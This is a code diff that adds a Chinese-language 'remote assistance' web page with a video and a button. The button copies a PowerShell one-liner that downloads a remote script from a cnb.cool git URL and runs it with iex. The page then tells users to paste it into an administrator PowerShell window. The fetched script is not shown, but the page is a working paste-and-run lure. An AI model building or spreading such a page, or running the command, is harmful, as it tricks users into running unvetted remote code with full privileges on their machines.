@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>干货分享家 - 远程协助</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            overflow-x: hidden;
+        }
+        video {
+            width: 90%;
+            max-width: 600px;
+            margin: 20px 0;
+        }
+        button {
+            cursor: pointer;
+            margin-top: 8px;
+            padding: 8px 16px;
+            font-size: 1rem;
+        }
+        /* 原 #win7Btn 样式已移除 */
+    </style>
+</head>
+<body>
+    <h1>干货分享家 - 远程协助</h1>
+    <video controls id="instructionVideo">
+        <source src="" type="video/mp4" id="videoSource">
+        你的浏览器不支持 video 标签。
+    </video>
+    
+    <!-- 复制命令按钮（固定为Win10/11配置） -->
+    <button id="copyBtn">复制 "运行远程软件" 命令</button>
+
+    <script>
+        (function() {
+            // 固定为 Windows 10/11 的配置（已移除系统版本判断）
+            var videoSrc = './0.mp4';
+            var cmdText = "$u='https://cnb.cool/GHFXJ/YC/-/git/raw/main';try{irm $u/X7.ps1|iex}catch{start $u/YC.zip}";
+            var successMsg = '已复制! 右击开始按钮 ➤ 单击Powershell(管理员) ➤ 右击粘贴';
+
+            // 设置视频源
+            var video = document.getElementById('instructionVideo');
+            var source = document.getElementById('videoSource');
+            if (video && source) {
+                source.src = videoSrc;
+                video.load(); // 重新加载视频
+            }
+
+            // ---------- 复制按钮逻辑 ----------
+            var copyBtn = document.getElementById('copyBtn');
+            if (copyBtn) {
+                var originalBtnText = copyBtn.innerText;
+
+                function onCopySuccess() {
+                    copyBtn.innerText = successMsg;
+                    setTimeout(function() {
+                        copyBtn.innerText = originalBtnText;
+                    }, 20000);
+                }
+
+                function onCopyError(err) {
+                    alert('复制失败，请手动选择命令后复制 (Ctrl+C)。\n' + (err || ''));
+                }
+
+                function copyToClipboard(text) {
+                    // 兼容IE
+                    if (window.clipboardData && window.clipboardData.setData) {
+                        try {
+                            window.clipboardData.setData('Text', text);
+                            onCopySuccess();
+                        } catch (e) {
+                            onCopyError(e);
+                        }
+                        return;
+                    }
+
+                    // 通用降级方案
+                    var textarea = document.createElement('textarea');
+                    textarea.value = text;
+                    textarea.style.position = 'fixed';
+                    textarea.style.left = '-9999px';
+                    textarea.style.top = '0';
+                    document.body.appendChild(textarea);
+                    textarea.select();
+                    try {
+                        var successful = document.execCommand('copy');
+                        if (successful) {
+                            onCopySuccess();
+                        } else {
+                            onCopyError('execCommand 返回 false');
+                        }
+                    } catch (err) {
+                        onCopyError(err);
+                    } finally {
+                        document.body.removeChild(textarea);
+                    }
+                }
+
+                copyBtn.addEventListener('click', function() {
+                    copyToClipboard(cmdText);
+                });
+            }
+
+            // ---------- 原 Win7 按钮相关代码已全部删除 ----------
+        })();
+    </script>
+</body>
+</html>
